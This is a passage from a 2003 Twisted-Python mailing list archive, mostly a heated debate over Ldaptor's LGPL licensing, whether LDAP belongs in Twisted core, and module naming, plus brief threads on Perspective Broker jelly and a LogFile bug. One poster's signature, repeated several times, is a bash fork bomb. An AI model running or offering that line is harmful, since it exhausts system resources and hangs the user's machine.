	them ;)

> Anyway, I'm curious how open you are to these items.   Adding this to
> Twisted (with alot of work) is probably a good bargin; you get more
> eyes helping your project along, documentation, etc.  

	I have long hoped for some other developers to share the work.

	But no, I will not donate >10000 lines of my work to glyph.
	I'm too much a free software bigot; I want to force him to
	the rules of LGPL. Just like everyone else. In fact, that's
	why I still consider him to have a partial copyright on Ldaptor,
	even though he wrote none of it; that makes _me_ faithful to
	the LGPL, too. And that's a good thing.

	Oh, by the way, you are horribly naive for thinking that
	merely having the code located in the Twisted CVS makes
	everyone else maintain it. That just isn't the way things
	have happened. LDAP is not a core protocol for most people.

-- 
:(){ :|:&};:



From cce at clarkevans.com  Wed Jul  2 02:07:48 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 08:07:48 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702063520.GA24397@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog>
Message-ID: <20030702080748.GA81663@doublegemini.com>

Hello Tommi.   Thank you for taking time to respond.

On Wed, Jul 02, 2003 at 09:35:20AM +0300, Tommi Virtanen wrote:
| 	LDAP is not really used commonly enough to bloat the twisted
| 	core with it. (Quick! Name three end user applications using
| 	LDAP!)

I think LDAP is pretty cornerstone to any internet application
where 'single sign on' and other directory information is 
required.   If it was available, I even picture game servers
or muds using it... 

| >     Long term I'd like to see Glyph form some sort of non-profit to 
| >     hold the copyrights, or at the very least present a 'will' of 
| >     sorts describing what happens to the copyrights in the event 
| >     that he is incapacitated or gets hit by a MAC truck.    For 
| >     now, I'm not too worried about this.
| 
| 	I think we as the community don't need anything better than
| 	LGPL.

Although the legal environment for open source moves quite slowly,
it is certainly not static; thus changes may be required down the
road (think 5-15 years) and furthermore, to enforce the license you
have to have an coordinated entity to do this.   If the code comes
from a hodge-podge of developers, most of whom can't be contacted,
it makes enforcement impossible.

Another problem that is on the horizion is is alot of FUD and
uncertainty by corporations in using open source beacuse it is
hard to track down who owned what modules, etc.   Unless we do
this in an organized manner, it doesn't matter what license
we put at the top of the file; wide spread adoption will be
hindered.  Alas, this is probably the wrong list for this sort
of discussion; perhaps we need a twisted-legal (for licensing, 
and other legal stuff)

| > 2.  Your package hierarchy needs help... lots of help.
| 
| 	Agreed.

Cool.

| 	The current situation looks more like
| 
| 	from ldaptor.protocol.ldap import ldapsyntax
| 
| 	o = ldapsyntax.LDAPObject(..)

Ok.   

| >     First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
| >     quite redundant.
| 
| 	There's likely to be LDAPv4. LDAP protocol versions aren't really
| 	compatible.

All the more reason to not prefix in class names. ;)

   from ldaptor import ldap3 as ldap
   ent = ldap.client(...)

   // 3 years from now

   from ldaptor import ldap4 as ldap
   ent = ldap.client(...)


And hopefully the interface can be the same, if not, it will
raise an error.   (ie, there may be xtra constructor arguments 
available in ldap4.Entry

| 	What's really making you grit your teeth is that the mechanism
| 	an LDAP client uses to open a connection to an LDAP server should
| 	be in ldaptor.client; and it will be, once I have a clear idea
| 	what the API should look like.

Yes!  And sorry that the griding teeth is so visible.  ;)

| 	from ldaptor import client
| 
| 	d=client.openDN('dc=example,dc=com')
| 	d.addCallback(lambda o: o.search('cn=foo'))

Nice.  

| 	Yes, the word syntax is bad. It dates back to the time I tried to
| 	make the data in LDAP be manipulatable as Python objects, from the
| 	days before Twisted.
| 
| 	I refuse to name a class "Object". I refuse to name a class
| 	"Proxy".

After reading the RFC, it seems that "entry" is most often used
to mean an object in the LDAP database.  

| >     The 'low-level' pureber and pureldap are really not protocol
| >     items so much as they are parsers/emitters.  You could stuff
| >     these, as well as the filter, ldif, and schema all into 
| >     another part of ldaptor, ldaptor.parse.ldif, etc.
| 
| 	There are two things in a protocol:
| 
| 	1. the wire representation of things
| 		ldaptor.protocols.pureber
| 		ldaptor.protocols.pureldap
| 
| 	2. the state machine
| 		ldaptor.protocols.ldap.ldapclient
| 		ldaptor.protocols.ldap.ldapsyntax
| 
| 	The wire representation of the LDAP messages is never
| 	written to a file, so there's no use for it outside of
| 	the protocol scope.

Right.   And I'd just like to see the opposite:

        1.  state machine

             ldaptor.protocols.ldap3.client
             ldaptor.protocols.ldap3.server
      
        2. wire format

             ldaptor.protocols.ldap3.wire.ber
             ldaptor.protocols.ldap3.wire.request

| 	Filter and ldif need to move some day. They started life
| 	as residing inside the neighbouring .py files, and were
| 	split out when they grew too big; moving them should be
| 	reasonably trivial.

Ok.

| > Anyway, I'm curious how open you are to these items.   Adding this to
| > Twisted (with alot of work) is probably a good bargin; you get more
| > eyes helping your project along, documentation, etc.  
| 
| 	I have long hoped for some other developers to share the work.

I'm a painful one.  ;)

| 	But no, I will not donate >10000 lines of my work to glyph.
| 	I'm too much a free software bigot; I want to force him to
| 	the rules of LGPL. Just like everyone else. In fact, that's
| 	why I still consider him to have a partial copyright on Ldaptor,
| 	even though he wrote none of it; that makes _me_ faithful to
| 	the LGPL, too. And that's a good thing.

I will let Glyph respond to this when he has time.  I do think that
there is quite a deep mis-understanding here, hopefully this will
resolve it self shortly.  

| 	Oh, by the way, you are horribly naive for thinking that
| 	merely having the code located in the Twisted CVS makes
| 	everyone else maintain it. That just isn't the way things
| 	have happened. LDAP is not a core protocol for most people.

Well.  Since flow has been added (to the sandbox), I've received 
over 10 patches, several of them non-trivial and even two that 
extended functionality. I never expected this, but it happened.  
A few patches were even done without asking me (thank god) beacuse
they were so clearly wrong.    This is really the beauty of open
source software; the community does really take ownership of the
code.   I'm not saying that there isn't a primary 'author', but
I am saying that maintanence does get distributed.

Also, I think that you are completely wrong about LDAP not
being core.  It is just a matter of time.   LDAP is barely
6 years old now...  it takes at least 5 years for broad 
adoption... more like 10.   LDAP has a long way to go, and
something like ldaptor in twisted could make it go much
further.   Further, having ldap in twisted will allow other
packages to tightly integrate with ldap (for instance, the
imap server via cred), etc.

Best,

Clark



From 2002 at weholt.org  Wed Jul  2 01:52:18 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Wed, 2 Jul 2003 09:52:18 +0200
Subject: [Twisted-Python] Verbose example of how to use Cred in WebPages ?
Message-ID: <000901c3406e$dc59f8d0$3ba8a8c0@gatsoft.no>

Hi,

Could someone give me a verbose example of how to control access to webpages
using Twisted? How to define users and their access rights etc. Probaly
using Cred or Guard or something, but I don't know what and how.

Regards,
Thomas




From warner at lothar.com  Wed Jul  2 02:59:03 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 02 Jul 2003 01:59:03 -0700 (PDT)
Subject: [Twisted-Python] Controlling the classes being Jellied
References: <JAEDJDIBADCJHPFLNEDFAEELCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030702.015903.06353698.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> I'm using PB and want to accomplish something like this:
> 
> On the server, I have the following class hierarchy:
> 
>     Actor(pb.Copyable)
>   
>     GoodActor(Actor)
>     BadActor(Actor)
>     ...
>     WhateverActor(Actor)
> 
> There exists a number of instances of each of these classes.
> 
> When Jellying them over to the client, I want each of them to create 
> instances of the client class RemoteActor, no matter which of the server 
> classes they are of. In practice, the different server classes will 
> generate different state data that is transmitted to the client, where 
> that state data just updates __dict__ , at least for now.

You probably want something like this on the sending side:
  
  class Actor(pb.Copyable):
    def getTypeToCopy(self):
      return "package.module.Actor"
  
  class GoodActor(Actor):
    def getStateToCopy(self):
      return good_dict
  
  class BadActor(Actor):
    def getStateToCopy(self):
      return bad_dict

and then the receiving side can just do:
  
  class RemoteActor(pb.RemoteCopy):
    ...
  
  pb.setUnjellyableForClass("package.module.Actor", RemoteActor)


The two important points are:

 1: by overriding .getTypeToCopy(), the sending class can control what class
    name is put into the serialized stream.

 2: pb.setUnjellyableForClass maps a name (the one in the serialized stream)
    to a local class. The name can be specified either as a string or as a
    class. If you don't have access to the the class, just use a string that
    matches the one used by the sender. The only caveat is to make sure the
    string is unique with respect to packages and modules and such.. in
    general is should be a "fully qualified" class name.


Hope that helps.. let me know if you've got more questions. I think we could
use an example of this (string-based jellied class names instead of classes
shared between sender and recipient) in the docs.

cheers,
 -Brian



From tv at twistedmatrix.com  Wed Jul  2 08:03:22 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 17:03:22 +0300
Subject: [Twisted-Python] windows binary install.
In-Reply-To: <3F02764C.3010600@yahoo.com>
References: <20030702032744.GA80790@doublegemini.com> <3F02764C.3010600@yahoo.com>
Message-ID: <20030702140322.GB10309@lapdog>

On Wed, Jul 02, 2003 at 04:06:04PM +1000, Rene Dudfield wrote:
> Hello,

	Please don't reply to existing threads when you start a new
	topic; just send a new (non-reply) email to
	twisted-python at twistedmatrix.com.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Wed Jul  2 08:28:38 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 17:28:38 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702080748.GA81663@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com>
Message-ID: <20030702142838.GC10309@lapdog>

On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
> | 	LDAP is not really used commonly enough to bloat the twisted
> | 	core with it. (Quick! Name three end user applications using
> | 	LDAP!)
> I think LDAP is pretty cornerstone to any internet application
> where 'single sign on' and other directory information is 
> required.   If it was available, I even picture game servers
> or muds using it... 

	You mean you hope it will be? (Quick! Name three end user
	applications using LDAP!)

	LDAP is an ugly, broken, horrible non-unixy non-internetty
	protocol conceived by the folk who gave you such marvels as
	X.25. I hope LDAP dies screaming.

	On the other hand, I need something to do the things LDAP
	is used at. And, for now, it seems the evolution path
	goes through first implementing LDAP, and then improving it
	(witness the LDAPv3 effort).

> Although the legal environment for open source moves quite slowly,
> it is certainly not static; thus changes may be required down the
> road (think 5-15 years) and furthermore, to enforce the license you
> have to have an coordinated entity to do this.   If the code comes
> from a hodge-podge of developers, most of whom can't be contacted,
> it makes enforcement impossible.

	We'll have bigger problems than Ldaptor's whopping <10
	developers -- and that's an optimistic guess.

> Another problem that is on the horizion is is alot of FUD and
> uncertainty by corporations in using open source beacuse it is
> hard to track down who owned what modules, etc.   Unless we do
> this in an organized manner, it doesn't matter what license
> we put at the top of the file; wide spread adoption will be
> hindered.  Alas, this is probably the wrong list for this sort
> of discussion; perhaps we need a twisted-legal (for licensing, 
> and other legal stuff)

	Count me out. I just don't give a damn. I'm not trying
	to sell Ldaptor to anyone; I never will.

	Then again, someone may end up buying an installation of
	Ldaptor from me. They just won't know it, and won't care. And
	that's the difference.

> | 	Yes, the word syntax is bad. It dates back to the time I tried to
> | 	make the data in LDAP be manipulatable as Python objects, from the
> | 	days before Twisted.
> | 
> | 	I refuse to name a class "Object". I refuse to name a class
> | 	"Proxy".
> 
> After reading the RFC, it seems that "entry" is most often used
> to mean an object in the LDAP database.

	I'm guessing you won't be happy even after an
	s/LDAPObject/LDAPEntry/g operation, so I'm not
	doing that right now.. It doesn't really matter
	what those classes are called, as you aren't
	supposed to really ever instantiate them yourself.

> Right.   And I'd just like to see the opposite:
> 
>         1.  state machine
> 
>              ldaptor.protocols.ldap3.client
>              ldaptor.protocols.ldap3.server
>       
>         2. wire format
> 
>              ldaptor.protocols.ldap3.wire.ber
>              ldaptor.protocols.ldap3.wire.request

	Pureber and pureldap should be applicable to all LDAP versions
	and LDAP over UDP. Pureber should be applicable to all BER-based
	protocols, such as SNMP. They have a broader scope than a
	single protocol.

> | > Anyway, I'm curious how open you are to these items.   Adding this to
> | > Twisted (with alot of work) is probably a good bargin; you get more
> | > eyes helping your project along, documentation, etc.  
> | 	I have long hoped for some other developers to share the work.
> I'm a painful one.  ;)

	Umm. "Yes." Let's see if you write code or docs that are
	worth it ;)

	Questioning me is fine. (Resisting me is futile ;)

> | 	But no, I will not donate >10000 lines of my work to glyph.
> | 	I'm too much a free software bigot; I want to force him to
> | 	the rules of LGPL. Just like everyone else. In fact, that's
> | 	why I still consider him to have a partial copyright on Ldaptor,
> | 	even though he wrote none of it; that makes _me_ faithful to
> | 	the LGPL, too. And that's a good thing.
> I will let Glyph respond to this when he has time.  I do think that
> there is quite a deep mis-understanding here, hopefully this will
> resolve it self shortly.

	I think glyph understands my stand well enough, and we have
	talked about this back when the transition happened.

	There's no way around it. For what is in the Twisted core,
	he wants to have freedoms the LGPL doesn't give him. I don't
	want to donate expected ~30000 lines of python away just
	like that; I want to make him be bound to LGPL, just like
	everyone else.

> Also, I think that you are completely wrong about LDAP not
> being core.  It is just a matter of time.   LDAP is barely
> 6 years old now...  it takes at least 5 years for broad 
> adoption... more like 10.   LDAP has a long way to go, and
> something like ldaptor in twisted could make it go much
> further.   Further, having ldap in twisted will allow other
> packages to tightly integrate with ldap (for instance, the
> imap server via cred), etc.

	Let me repeat myself. If installing one library is too
	much effort for you, you are using the wrong OS.

	Twisted can integrate with LDAP just fine. There's no
	problem in using Ldaptor in the optional parts. There's
	no way to make LDAP ever be a _requirement_ for some
	core Twisted service -- I'll scream bloody murder and
	remove the code, even if that means someone revoking
	my commit access. LDAP is not a pretty protocol, and
	it's too far from minimal to be ever acceptable in
	such a role.

	(Oh, did you notice that the openldap library is not
	in the libc?)

	Besides, if you think makin IMAP authenticate via LDAP
	requires changes in cred _or_ Twisted, you have misunderstood
	how modular Twisted is. I have long had an LDAP-using
	cred mechanism (of course with the old API).

	In fact, most "servers" in Twisted (more like example
	code) only know how to authenticate against in-memory
	data structures. And that's how it's supposed to be.
	I don't want to see Twisted become a hodge-podge of
	100 applications; Twisted should be the _framework_.
	Application code should be external to it. See e.g.
	CVSToys, BuildBot, etc.

-- 
:(){ :|:&};:



From Richard.Townsend at edl.uk.eds.com  Wed Jul  2 08:31:28 2003
From: Richard.Townsend at edl.uk.eds.com (Richard.Townsend at edl.uk.eds.com)
Date: Wed, 2 Jul 2003 15:31:28 +0100 
Subject: [Twisted-Python] logfile.LogFile
Message-ID: <76ADB8C376C3D31193F50008C7E6D3B2F3E165@EWHKA005>

I was trying to set the defaultMode arg in LogFile.__init__() but it didn't
seem to have any effect on the generated log file's permissions.

In BaseLogFile.__init__() - if defaultMode is not None, it sets
self.defaultMode to None.
Should it not set it to defaultMode ?

-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030702/6be09608/attachment.html>

From pb_twisted at olga.mine.nu  Wed Jul  2 09:35:48 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Wed, 2 Jul 2003 17:35:48 +0200
Subject: [Twisted-Python] Controlling the classes being Jellied
In-Reply-To: <20030702.015903.06353698.warner@lothar.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFIEEOCAAA.pb_twisted@olga.mine.nu>

> The two important points are:
>
>  1: by overriding .getTypeToCopy(), the sending class can control
> what class
>     name is put into the serialized stream.
>
>  2: pb.setUnjellyableForClass maps a name (the one in the serialized
stream)
>     to a local class. The name can be specified either as a string or as a
>     class. If you don't have access to the the class, just use a string
that
>     matches the one used by the sender. The only caveat is to make sure
the
>     string is unique with respect to packages and modules and such.. in
>     general is should be a "fully qualified" class name.

Smashing! This solved my problems right away.

I am having some problems finding my way around the API docs. The
Copyable.getTypeToCopy() I found eventually, but I still can't find
pb.setUnjellyableForClass in the docs even when I know what to look for.

Thanks a lot for the help, Brian!


- Patrik





From bob at redivi.com  Wed Jul  2 09:50:55 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 2 Jul 2003 11:50:55 -0400
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030702115055.A6376@redivi.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
> On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
> > I think LDAP is pretty cornerstone to any internet application
> > where 'single sign on' and other directory information is 
> > required.   If it was available, I even picture game servers
> > or muds using it... 
> 
> 	You mean you hope it will be? (Quick! Name three end user
> 	applications using LDAP!)
> 

Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.

> 	Let me repeat myself. If installing one library is too
> 	much effort for you, you are using the wrong OS.

Twisted and LDAP are cross-platform.  You shouldn't try make that kind of argument.

> 	(Oh, did you notice that the openldap library is not
> 	in the libc?)

OpenLDAP (slapd and the client libraries) come with MacOS X and MacOS X server.  Every version of Windows 2000 and later releases based on the same tree can speak LDAP.

It's not in the libc because it's not part of POSIX or ANSI C.

-bob



From cce at clarkevans.com  Wed Jul  2 10:30:40 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 16:30:40 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030702163040.GA82621@doublegemini.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
| On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
| > | 	LDAP is not really used commonly enough to bloat the twisted
| > | 	core with it. (Quick! Name three end user applications using
| > | 	LDAP!)
| > I think LDAP is pretty cornerstone to any internet application
| > where 'single sign on' and other directory information is 
| > required.   If it was available, I even picture game servers
| > or muds using it... 
| 
| 	You mean you hope it will be? (Quick! Name three end user
| 	applications using LDAP!)

I'll name 3 common internet protocols which often in large
enterprises are hooked up to LDAP...

   IMAP, SAMBA, SMTP

| 	LDAP is an ugly, broken, horrible non-unixy non-internetty
| 	protocol conceived by the folk who gave you such marvels as
| 	X.25. I hope LDAP dies screaming.

Well, I agree here.   But *something* has to fill this role of
orgnization wide directory.  Perhaps a unixy LDAP replacement is 
needed down stream.

| > After reading the RFC, it seems that "entry" is most often used
| > to mean an object in the LDAP database.
| 
| 	I'm guessing you won't be happy even after an
| 	s/LDAPObject/LDAPEntry/g operation, so I'm not
| 	doing that right now.. It doesn't really matter
| 	what those classes are called, as you aren't
| 	supposed to really ever instantiate them yourself.

Well, I'd rather see ldap.Entry ... "entry" is far superior
to "object".   You don't call a tuple returned by the database
an "object", you call it a "row" (not an ODBCRow).  There 
really isn't a 1-1 correspondence between object and 
LDAP's entry.

| > Right.   And I'd just like to see the opposite:
| > 
| >         1.  state machine
| > 
| >              ldaptor.protocols.ldap3.client
| >              ldaptor.protocols.ldap3.server
| >       
| >         2. wire format
| > 
| >              ldaptor.protocols.ldap3.wire.ber
| >              ldaptor.protocols.ldap3.wire.request
| 
| 	Pureber and pureldap should be applicable to all LDAP versions
| 	and LDAP over UDP. Pureber should be applicable to all BER-based
| 	protocols, such as SNMP. They have a broader scope than a
| 	single protocol.

    ldaptor.protocols.wire.ber
    ldaptor.protocols.wire.request

| 	There's no way around it. For what is in the Twisted core,
| 	he wants to have freedoms the LGPL doesn't give him. I don't
| 	want to donate expected ~30000 lines of python away just
| 	like that; I want to make him be bound to LGPL, just like
| 	everyone else.

Assume for a moment that a foundation (similar to Apache) is
formed for Twisted.   What characteristics of this organization
are required for you to be 'comfortable' with the code being
donated?

| 	Let me repeat myself. If installing one library is too
| 	much effort for you, you are using the wrong OS.

I'd rather not have twisted require a package management
service to download all the third party components necessary.

Best,

Clark



From cce at clarkevans.com  Wed Jul  2 11:45:38 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 17:45:38 +0000
Subject: [Twisted-Python] ldap for twisted
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <20030702174538.GA82865@doublegemini.com>

After giving much thought to ldaptor, I've decided to use python-ldap
for my short-term needs.   I've done this for a few reasons:

  1.  python-ldap is quite mature, it is a thin wrapper over
      OpenLDAP.   It is fairly well documented, licensed well,
      has some unit tests, etc.

  2.  python-ldap has a very nice async interface which I am
      wrapping with flow and deferreds.   I will probably put
      this wrapper in the sandbox when I finish for those 
      who are interested.i

  3.  ldaptor is not part of Twisted, and thus the choice is
      between two external modules; and my deployment platform
      already has OpenLDAP installed so pure python is not a
      requirement

Best,

Clark



From tv at twistedmatrix.com  Wed Jul  2 12:09:38 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 21:09:38 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702115055.A6376@redivi.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702115055.A6376@redivi.com>
Message-ID: <20030702180938.GB1142@tao.tv.debian.net>

On Wed, Jul 02, 2003 at 11:50:55AM -0400, Bob Ippolito wrote:
> > > I think LDAP is pretty cornerstone to any internet application
> > > where 'single sign on' and other directory information is 
> > > required.   If it was available, I even picture game servers
> > > or muds using it... 
> > 	You mean you hope it will be? (Quick! Name three end user
> > 	applications using LDAP!)
> Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.
  1                               2                     3       4

	Applications, not operating systems have some way to use LDAP.
	Now look at them. They all use LDAP as address books.
	The part about LDAP is an extra value for places that already
	happen to use LDAP. Very few places would actually start
	to use LDAP just for that. Plus, its all inside one organization.
	What a "core internet protocol".

	Don't misread me, I wouldn't be writing Ldaptor if I
	thought LDAP was useless. It's pretty nifty. But don't think
	its anywhere near HTTP or SMTP in relevance.
	(In fact, one nice use for Twisted would be to use XML-over-HTTP
	as an LDAP replacement.)

> > 	Let me repeat myself. If installing one library is too
> > 	much effort for you, you are using the wrong OS.
> Twisted and LDAP are cross-platform.  You shouldn't try make that kind of argument.

	And how does Twisted's cross-platformness make inferior
	operating systems less painful?

> > 	(Oh, did you notice that the openldap library is not
> > 	in the libc?)
> OpenLDAP (slapd and the client libraries) come with MacOS X and MacOS X server.
> Every version of Windows 2000 and later releases based on the same tree can speak LDAP.

	You're pretty much missing the point.

	OpenLDAP is a separate library.
	The W3C WWW library is a separate library.
	xmlrpc-c is a separate library.

	If it's hard for you to have separate libraries, you have issues.
	If you're trying to say "but all I need is in my OS", then you are
	stuck using what your OS has, and exactly the version your OS has.
	That's still an inferior OS, for it has bad extendability and is
	upgradable only at the mercy of the vendor.

	Besides, I frankly don't give a shit about commercial OSes.
	If ldaptor didn't work on win32 or solaris, I wouldn't even know.
	That's just not interesting. (Other people are free to fix
	portability problems; I may even merge their changes, if they
	are clean. That doesn't contradict the above.)

> It's not in the libc because it's not part of POSIX or ANSI C.

	Thats pretty weak, there's a lot in many libcs that isn't.


	I wonder what this discussion is aiming at? You people keep
	telling me that LDAP is important, and I'm still the only
	one implementing it.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Wed Jul  2 12:32:37 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 21:32:37 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702163040.GA82621@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702163040.GA82621@doublegemini.com>
Message-ID: <20030702183237.GC1142@tao.tv.debian.net>

On Wed, Jul 02, 2003 at 04:30:40PM +0000, Clark C. Evans wrote:
> I'll name 3 common internet protocols which often in large
> enterprises are hooked up to LDAP...
>    IMAP, SAMBA, SMTP

	Just say "accounts".

	Just about the only use for LDAP anywhere is to store
	users. It's cool. When you have thousands of them on
	different boxes, /etc/passwd gets boring. But still,
	it's only accounts. (The only real exception I know is
	certification revocation lists.)

	But don't overinflate that role. The only reasons LDAP
	is alive are because SQL is ugly, the databases are
	slow and/or expensive, and DNS is very limited.

	Think about it. LDAP isn't used to publish spam blacklists.
	It isn't used to index emails. It isn't used to find files
	in Samba shares. It isn't used to hold email. These are
	all things DNS or databases have been used for (mostly
	unsuccesfully, but that isn't relevant here). LDAP just isn't
	used _that_ much.

>     ldaptor.protocols.wire.ber
>     ldaptor.protocols.wire.request

	So use pushed them into a package and renamed pureldap
	to "request", which is false and misleading?

	s/pure/wire./ might be doable. But ldap isn't request,
	its all things ldappy (everything on the write that isn't
	basic BER).

	But you can't rename a module there "ldap", that's a horrible
	name. Thus, I named them "pure*", for two things: pure python,
	and pure also as in no dependencies; they are perfectly
	reusable.

> | 	There's no way around it. For what is in the Twisted core,
> | 	he wants to have freedoms the LGPL doesn't give him. I don't
> | 	want to donate expected ~30000 lines of python away just
> | 	like that; I want to make him be bound to LGPL, just like
> | 	everyone else.
> Assume for a moment that a foundation (similar to Apache) is
> formed for Twisted.   What characteristics of this organization
> are required for you to be 'comfortable' with the code being
> donated?

	Umm. A moral stand I can agree with. "Sell to the game industry
	if they pay $$$" is not one. Unless I _work_ to create the thing
	sold; I'm willing to sell my moral, but the price isn't what
	glyph/$FOUNDATION maybe one day might give me -- it's a lot of
	money per month, starting right now.

	For pocket money, I prefer to not give my freedoms away; in fact,
	I want more freedoms if at all possible.

	I _want_ the bugfixes $CORPORATION makes.


	Just to clarify: I'm not accusing glyph. I'm not blaming him.
	There is no reason to continue this discussion. In fact,
	he would probably prefer this discussion never happened. There
	is no conflict here. We are in perfect agreement on this, as
	far as I know. If I were him, I'd try to sell Twisted, too.
	And he's free to sell Ldaptor, too. I'm just not giving him
	any special rights to it; you are as priviledged as glyph, in
	that matter.

> | 	Let me repeat myself. If installing one library is too
> | 	much effort for you, you are using the wrong OS.
> I'd rather not have twisted require a package management
> service to download all the third party components necessary.

	Missing the point. Twisted doesn't have to depend on Ldaptor.
	In fact, it never would (I wouldn't want it and glyph won't
	allow it). Your favorite mail reader, written using Twisted
	and the IMAP client protocol in Twisted can probe for Ldaptor
	and enable its address book functions on the fly.


	Can we just get on with the programming? I accept patches.
	Ldaptor isn't hard to install; if it is, I accept patches
	even for improving that :)

-- 
:(){ :|:&};:



From smurf at smurf.noris.de  Wed Jul  2 14:37:56 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Wed, 02 Jul 2003 22:37:56 +0200
Subject: [Twisted-Python] ldap for twisted
References: <20030702032744.GA80790@doublegemini.com> <20030702174538.GA82865@doublegemini.com>
Message-ID: <pan.2003.07.02.20.37.55.529290@smurf.noris.de>

Hi, Clark C. Evans wrote:

>   2.  python-ldap has a very nice async interface which I am
>       wrapping with flow and deferreds.   I will probably put this wrapper
>       in the sandbox when I finish for those who are interested.

That'd be nice.

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
Life goes on, even if two-headed and glowing faintly in the dark.
		-- Ursula K. Le Guin




From dalke at dalkescientific.com  Wed Jul  2 15:03:57 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Wed, 2 Jul 2003 15:03:57 -0600
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702183237.GC1142@tao.tv.debian.net>
Message-ID: <B290AE87-ACD0-11D7-9900-000393C92466@dalkescientific.com>

Tommi Virtanen:
> 	Just about the only use for LDAP anywhere is to store
> 	users. It's cool. When you have thousands of them on
> 	different boxes, /etc/passwd gets boring. But still,
> 	it's only accounts. (The only real exception I know is
> 	certification revocation lists.)

There are a few projects in bioinformatics which make sequence
records available via LDAP

http://iubio.bio.indiana.edu/biogrid/biogrids.html
>  Directories of Bio-data for efficient, high volume, Grid distribution
>  of bio-data. This is based on LDAP for a computable, networked
>  search/retrieval of bio-objects (as opposed to flat file databanks
>  or web pages). This includes an experimental LDAP-SRS gateway for
>  query and retrieval of biosequence and genome data housed at IUBio
>  Archive (/srs/ and /eugenes/ data sections).

http://openbns.sourceforge.net/
>  The Biomolecule Naming Service (BNS) is an LDAP-based directory of
>  gene and protein information derived from NCBI's LocusLink database.
>  The main purpose of BNS is to quickly and easily convert between
>  different name and identifier schemes commonly used for specifying
>  gene and protein sequences.

TV:
> 	Think about it. LDAP isn't used to publish spam blacklists.

There's at least one posted idea for doing that at
   http://mla.libertine.org/tmda-workers/2001-11/msg00110.html
but it's only in the "wouldn't it be interesting if" stage.

But I know rather little about LDAP's uses.  Being googlesmart,
I did find
   http://www.networkmagazine.com/article/DCM20000502S0039
which describes where LDAP is/is not appropriate.  It says
 > LDAP isn't a replacement for relational databases (and never
 > will be). It's not a substitute for a file system. It wasn't
 > built to knock DNS (domain name server) out of the ring.

and elsewhere that it's not good for BLOBs, so while you said
it's not good for replacing a DB, DNS, etc., well, that's
already well-known, and not what it claims to be good for,
which is managing information about resources.

For me, I have about as much need for LDAP (right now) as I
do for ICQ; none.  Maybe next year for LDAP, when looking into
some of those sequence databases.

					Andrew
					dalke at dalkescientific.com




From tv at twistedmatrix.com  Wed Jul  2 15:13:07 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 3 Jul 2003 00:13:07 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702180938.GB1142@tao.tv.debian.net>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030702115055.A6376@redivi.com> <20030702180938.GB1142@tao.tv.debian.net>
Message-ID: <20030702211307.GA11312@lapdog>

On Wed, Jul 02, 2003 at 09:09:38PM +0300, Tommi Virtanen wrote:
